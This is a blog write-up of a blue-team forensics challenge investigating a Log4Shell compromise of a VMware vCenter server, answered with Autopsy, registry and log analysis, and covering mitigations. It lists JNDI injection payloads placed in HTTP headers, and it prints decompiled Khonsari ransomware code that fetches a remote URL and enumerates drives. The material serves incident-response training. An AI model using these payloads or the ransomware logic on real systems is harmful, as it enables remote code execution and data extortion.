---
layout: post
title: Detecting and defending against log4j attacks
categories:
- CTF
- Forensics
tags:
- CTF
- Windows-Forensics
- Log4j
- Log4shell
- Reverse-Engineering
date: 2022-02-19 15:45 +0800
---
Point: 2000

<a href="https://cyberdefenders.org/blueteam-ctf-challenges/progress/rootware/86/"><img src="https://img.shields.io/badge/completed-detectlog4j-brightgreen.svg" /></a>

## Category

Forensics, Reverse-engineering

## Challenge Details

For the last week, log4shell vulnerability has been gaining much attention not for its ability to execute arbitrary commands on the vulnerable system but for the wide range of products that depend on the log4j library. Many of them are not known till now. We created a challenge to test your ability to detect, analyze, mitigate and patch products vulnerable to log4shell.

## Solution

### 1. What is the computer hostname?

**hostname: VCW65**

The computer hostname can be found in the network setup log file which is recording the domain join activity. The path to the file is `C:\Windows\debug\NetSetup.LOG`

![netsetup](https://bn1304files.storage.live.com/y4mbJTqryKZecaAfzMVMLEKav0F1602GIIPZAtUoHNRRSJeWg8TsU_kBrjrhwNhgBzm6xVP6hewaVp6L_645W7uWRDOcDmr84BwkzknflsubNmACj_zYkTfdn88MBw3BQPs4D1W9hQu7xYTQ60Ao33JrJoOH-j1_9SZ1_6w9RUhWa7WnfVCogbY9CB6CkmbIC-V6tIhOzoj-mMObxrIK1sdAZ2dOFf1HQCunJZSrnxJqZU?encodeFailures=1&width=1087&height=615)

### 2. What is the Timezone of the compromised machine?

**UTC-8**

Using Autopsy, you are able to view registry files through `SYSTEM` registry in the following path:

`C:\Windows\System32\config\SYSTEM`

Open the `SYSTEM` registry file > go to ControlSet001 > Control > TimeZoneInformation > TimeZoneKeyName

![timezone](https://bn1304files.storage.live.com/y4m7u6Gtw_J9so9OpGbKH5fqNZ19do5Z0xUHxKuMXPdWWHiXoUaitLO9PR762MQGxAKzue4hOmmj4OHLyVQ-srCiT7ryfalbwRmKwVyRgRLR2QTi6fa_wtPulVeHTaUNcJOA_1dgAJ90TwzlNuunGdMY4gSQOHUovvUBFJaw-yc9vn_RWuD-ReF4FzcUKLatqkGpv1E9MwFMV1_dL8pj0QT3DTkBeUX8Lg18h4M2VN_Fgg?encodeFailures=1&width=842&height=321)

`Pacific Standard Time`

We can see that the time zone is in PST. By default PST and UTC have difference of 8 hours

### 3. What is the current build number on the system?

**The current build number is 14393.**

The current windows build number can be found via `SOFTWARE` registry within Autopsy via this path.

`C:\Windows\System32\config\SOFTWARE`

Open the `SOFTWARE` registry file > Microsoft > Windows NT > CurrentVersion

![buildversion](https://bn1304files.storage.live.com/y4mUO5CYgH6yHIpc81beod48PNNBQ0VH2PqrM0jtbNCdv5UO_frCUHZ1baT7rr5XGlmIUsNpLDDxzgQ4WcQm_tEz8sw6pA52qrCA87CQH1Y9OX_eaMfPZ1DzRbXMqoGZEyL3-OX3dpBmWJxWcsZd4ORRhoVfv-GvVkGLD9VLDaP-n2K51iz-d9Ao2wZUroLwGEyDzEJ63Jb_Tl-6iZMwzVrWynKeErtlvQ3A7VjcudcNuU?encodeFailures=1&width=1750&height=794)

### 4. What is the computer IP?

**The IP address is 192.168.112.139**

The IP address of the computer can be found in previous `SYSTEM` registry as follow.

Open the `SYSTEM` registry file > go to ControlSet002 > Services > Tcpip > Parameters > Interfaces > `{82e9...}`

![ipaddress](https://bn1304files.storage.live.com/y4mU-57GnbO9G5X4USYrAze7wrgcOkfmZj-F8jIBZ7ZaPpKoBvcGLXl59slrVQd83SK_o3EzWrjLCRt-qAwb-1BHdg8-K8iBihWPpEEccOfVygysBgDF6VvulitUaWgV1gkuMP2GQoG-lyEXob2kWKbQTsRsW2TnmYzSWvBAymyNOFz5WQcVyQ81moczlpJ0RKeHGx4_kvWYioQbEf51xtV9IqKM_FaApgZnE4SrSEPiy4?encodeFailures=1&width=1866&height=1118)

### 5. What is the domain computer was assigned to?

**cyberdefenders.org**

The domain of the computer can be found in previous `SYSTEM` registry as follow.

Open the `SYSTEM` registry file > go to ControlSet002 > Services > Tcpip > Parameters

![domain](https://bn1304files.storage.live.com/y4mgVREtJlNKr-fqB3CiAiN-vIh6DsXRAr1qe_UvfubOs2oB7FBYeYzCUFj1YgmszOfCNLqD2T4kdr1FlSSzkziW4aKYEs7EqAhuEyCg9qCN6wyf8SYCdgtFf9zCoPUSS74ax7OljZvLdJyuqh4VtUK3pm2eAi1mNa8j2VJJYaqe0lb53kij116u7VyqZ_wMfjRMsLWtiEdfB4HaSTkxyKTJJLJoVhImVALVGC89UquZlo?encodeFailures=1&width=1866&height=1118)

### 6. When was myoussef user created?

**2021-12-28 06:57:23 UTC**

From Autopsy, go to OS Accounts under the tree view on the left and search for the user **myoussef** in the results as below.

![image](https://bn1304files.storage.live.com/y4mGpv_F3XK4nGanU6LDQg_wXuLDHtpj1ID5BtE9bTHg-jw6iyHyfCRSklXb4udDShiERJZmb64TLdQZZchlwUg8om-K1m4z4HMKFZHhBdLRSB-S_h3yq088Kkz048_czgOLjoL5xZYH2UrLrlC3u8BgKZeI8T3U5bYYN__sk6WYJNUiZVM5ci8hRSL8aCdDwFrWoLV1hxqG-HA3d6gC8jkxsoUaqH9ThroVoy07zCGTIY?encodeFailures=1&width=1263&height=727)

### 7. What is the user mhasan password hint?

<https://www.linkedin.com/in/0xmohamedhasan/>

We can see from the results that mhasan's password hint is a linkedin profile.

![image](https://bn1304files.storage.live.com/y4micuGa0VH-ovWswZ6EzPOtBLg_c4u8V02cc9p2LJI5OjGeRKfCWti8ZMy5fEaulj-cYNMpU_LQLwDP7eRCm7GGP60mgvdJEtuRBYt852Qt3guTGkAsl_Yapp8MWI1S22eUtS2R1kW45zQd-oNpLEwEJY_GZur6YNZwA6zsmzwKIOc_snhd5bVJ7m9jFkGjW-pL2zt8oU1et3MGGbWTVMiQnOvQsW9k44OBmTeTaGpl7k?encodeFailures=1&width=1263&height=727)

### 8. What is the version of the VMware product installed on the machine?

**6.7.0.40322**

The version of VMWare product installed can be checked via *Installed programs* can be shown under *Data Artifacts* > *Installed Programs*

![image](https://bn1304files.storage.live.com/y4mwA2vCw1haeuFwJETHlucmdHCO97vtCWhV0Ok2ZyPhFEDvE23A95ms_JDlNs7CQfhHAQ5Rjqt6Yh4xtxvyfy8UnmiIE31HoDmX8APFzoYGBglahBSh_iDTQzUl4l2jqAdqrBCv9H2TgR7ZxIWN4A9JCOwtjK0qkO6kqZflqEZQwzR0ivCuPmPuNmWMMiw6bnE5Mzduw0VzfKaEoYnl0YkYGYkHj4zosRvHsoaMkVNAPs?encodeFailures=1&width=945&height=84)

### 9. What is the version of the log4j library used by the installed VMware product?

**2.11.2**

The version of log4j library VMWare product is using can be checked in the following path via Autopsy.

`C:\Program Files\VMWare\vCenter Server\common-jars\log4j-core-2.11.2jar`

### 10. What is the log4j library log level specified in the configuration file?

**info**

This needed some digging as the log4j.properties is the main config file that keeps log4j configurations in key-value pairs. So a keyword search was done via Autopsy to look for log4j.properties file within the disk.

![image](https://bn1304files.storage.live.com/y4mUJ2QqivuVvZdwQx_WryybKHkkmrNMJ21W59cOPOv1ryYxYoryjyAPqEdk-9yQIu005WgboSV3ETIIGATltHjstcFStZuiph2BD3mcHwqXKIA6ikJ52tE3vsvcpunpHEMGhJtx0B5fWxMC0x2exh6pwol_fPL2y3opxO5MelT9RqVX8FV9D0c6VihKuiXOIvBmFA8Z0QwTO8LHRL7ct8j8E5Cbmpg1gf08x8R2Gn41fw?encodeFailures=1&width=2240&height=1312)

### 11. The attacker exploited log4shell through an HTTP login request. What is the HTTP header used to inject payload?

`X-Forwarded-For`

By searching around on google for log4shell exploit through HTTP header I come across a [blog](https://runpanther.io/blog/panthers-guide-to-log4j-exploitation-prevention-and-detection/) using below headers to inject the payload.

```text
Referer=${jndi:ldap://example.com/…}
X-Forwarded-For=${jndi:ldap://example.com/…}
User-Agent=${jndi:ldap://example.com/…}
```

With the hint given in the question, the answer was deduced.

### 12. The attacker used the log4shell.huntress.com payload to detect if vcenter instance is vulnerable. What is the first link of the log4huntress payload?

**log4shell.huntress.com:1389/b1292f3c-a652-4240-8fb4-59c43141f55a**

A search for the keyword “log4shell.huntress.com” is crafted, then found a websso.log in the Result Viewer. From the result viewer the first link of log4shell payload can be found.

### 13. When was the first successful login to vsphere WebClient?

**28/12/2021 20:39:29 UTC**

The login event can be found via VMWare's `audit_events.log` found in the path below via Autopsy.

`C:\Program Files\VMWare\vCenterServer\runtime\VMWareSTSService\logs\audit_events.log`

### 14. What is the attacker's IP address?

**192.168.112.128**

The attacker's ip address can be found via the same `audit_events.log` via Autopsy.

`C:\Program Files\VMWare\vCenterServer\runtime\VMWareSTSService\logs\audit_events.log`

### 15. What is the port the attacker used to receive the cobalt strike reverse shell?

**1337**

Cobalt Strike is usually used with a Base64 encoded PowerShell command. The lowest hanging fruit would be to identify the attack by going through `Microsoft-Windows-PowerShell%4Operational.evtx`. Sure enough a Base64 encoded was found in the logs which decodes to `192.168.112:128:1337`

### 16. What is the script name published by VMware to mitigate log4shell vulnerability?

**vc_log4j_mitigator.py**

By digging on google, VMWare has published a [blog](https://kb.vmware.com/s/article/87081) on mitigating the vulnerability.

### 17. In some cases, you may not be able to update the products used in your network. What is the system property needed to set to 'true' to work around the log4shell vulnerability?

**log4j2.formatMsgNoLookups**

By googling *change system property to mitigate log4shell vulnerability*, an article published by [jfrog] has stated a mitigation method that disables lookups by setting the system property as below.

`log4j2.formatMsgNoLookups=True`

### 18. What is the log4j version which contains a patch to CVE-2021-44228?

**2.15.0**

### 19. Removing JNDIlookup.class may help in mitigating log4shell. What is the sha256 hash of the JNDILookup.class?

`0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e`

Simply extract the `log4j-core-2.11.2jar` file from the below path via Autopsy.

`C:\Program Files\VMWare\vCenter Server\common-jars\log4j-core-2.11.2jar`

The `JndiLookup.class` file needs to be further extracted from `log4j-core-2.11.2jar`. This can be done using 7zip or any unzipping software.

Once that file is extracted, sha256 hash of the class can be computed as below.

```powershell
Get-FileHash .\JndiLookup.class | Format-List
Algorithm : SHA256
Hash      : 0F038A1E0AA0AFF76D66D1440C88A2B35A3D023AD8B2E3BAC8E25A3208499F7E
Path      : C:\Users\uname\Desktop\Log4shell\log4j-core-2.11.2\org\apache\logging\log4j\core\lookup\JndiLookup.class
```

### 20. Analyze JNDILookup.class. What is the value stored in the CONTAINER_JNDI_RESOURCE_PATH_PREFIX variable?

**java:comp/env/**

The `CONTAINER_JNDI_RESOURCE_PATH_PREFIX` can be found in the path below.

`C:\Program Files\VMWare\vCenter Server\cm\lib\log4j-core.jar`

### 21. What is the executable used by the attacker to gain persistence?

**baaaackdooor.exe**

The exe can be discovered in the below path.

`C:\Users\Administrator.WIN-B633EO9K91M\NTUSER.DAT`

Click on `NTUSER.DAT` and expand SOFTWARE > Microsoft > Windows > CurrentVersion, then click on RunOnce

![image](https://bn1304files.storage.live.com/y4mP2NX1n_VSJjPkROjPUHNSoLhhCWCV3LVkYaCUa6ioElcT1fLW-n2jZCWXhhCF9eC-g2HWUexz_5w7Mbg7Dyk2rCWlhNkpq2znKDSgtyrJMvCXwChjyc0ClvfznZ-smNmaTKmn0dBdMaIFn_tyy85vKO0WbG_L9_sujO3Pdt2JtfOS1NZFXF9sN4SHWybKW1yx5nTZ6kVtag493d8TiLttME2p5yJMauvXoA2d_p-4dk?encodeFailures=1&width=2122&height=1372)

### 22. When was the first submission of ransomware to virustotal?

**2021-12-11 22:57:01**

The sha256 hash: `f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789` of `baaaackdooor.exe` can be searched on Virustotal for First Submission under history.

### 23. The ransomware downloads a text file from an external server. What is the key used to decrypt the URL?

**"GoaahQrC"**

More research is done on this ransomeware via virustotal an detailed article on khonsari malware for apache log4j is found and was able to get the key to decrypt.

<https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/>

> `info` Another way to get the key is to reverse engineer the malware.
{: .prompt-info }

Using the `f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789` from question 23, we can download the malware from <https://bazaar.abuse.ch/> and open it up in [dnspy](https://github.com/dnSpy/dnSpy#:~:text=dnSpy%20is%20a%20debugger%20and,Main%20features%3A&text=NET%20and%20Unity%20assemblies), a .Net debugger.

```cs
private static void Main()
 {
  List<string> list = new List<string>();
  WebClient webClient = new WebClient();
  string text = "/\u001b\u0015\u0011R~]pi^UTF`CviVUN\u00120\u001f!(\u001c>\u0002\t=\u0016,\u0018\v\u0004>\u0018\u007f\u0006;3";
  string text2 = text;
  string edhcLlqR = text2;
  string text3 = "GoaahQrC";
  string text4 = text3;
  string vnNtUrJn = text4;
  webClient.DownloadString(oymxyeRJ.CajLqoCk(edhcLlqR, vnNtUrJn));
  foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
  {
   string name = driveInfo.Name;
   string text5 = "2w\u0015";
   string text6 = text5;
   string edhcLlqR2 = text6;
   string text7 = "qMIamfMA";
   string text8 = text7;
   string vnNtUrJn2 = text8;
   if (!name.Equals(oymxyeRJ.CajLqoCk(edhcLlqR2, vnNtUrJn2)))
   {
    list.Add(driveInfo.Name);
   }
  }
```

From dnspy, right-click on the executable and select the go-to entry point.
we can find the main function and see that `string text3` variable is being passed around to decrypt the external url.

### 24. What is the ISP that owns that IP that serves the text file?

**amazon**

This can be found from the previous Virustotal results.

<https://www.virustotal.com/gui/file/f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789/relations>

### 25. The ransomware check for extensions to exclude them from the encryption process. What is the second extension the ransomware checks for?

The extension is **ini** as mentioned in the same report from question 23.
<https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/>

> `info` Another way to get the key is to reverse engineer the malware.
{: .prompt-info }

In the same debugger session of dnspy from question 23 we can check the `LxqQXinF` function that is checking strings. The interesting variable here is `edhcLlqR2` which checks the condition and decrypts to ini extension.

```cs
private static bool LxqQXinF(string YzmfzBzk)
 {
  string text = "\u007f\u001d\0\a\u000f\"\u000e%8";
  string text2 = text;
  string edhcLlqR = text2;
  string vnNtUrJn = "QvhhaQoW";
  if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR, vnNtUrJn)))
  {
   string text3 = "g\u001d/.";
   string edhcLlqR2 = text3;
   string text4 = "ItAGEocK";
   string vnNtUrJn2 = text4;
   if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR2, vnNtUrJn2)))
   {
    string text5 = "\r\a2";
    string edhcLlqR3 = text5;
    string text6 = "diYplLvh";
    string text7 = text6;
    string vnNtUrJn3 = text7;
    if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR3, vnNtUrJn3)))
    {
     return YzmfzBzk.Equals(SCVuZRaW.HtqeFwaI);
    }
   }
  }
  return true;
 }
```
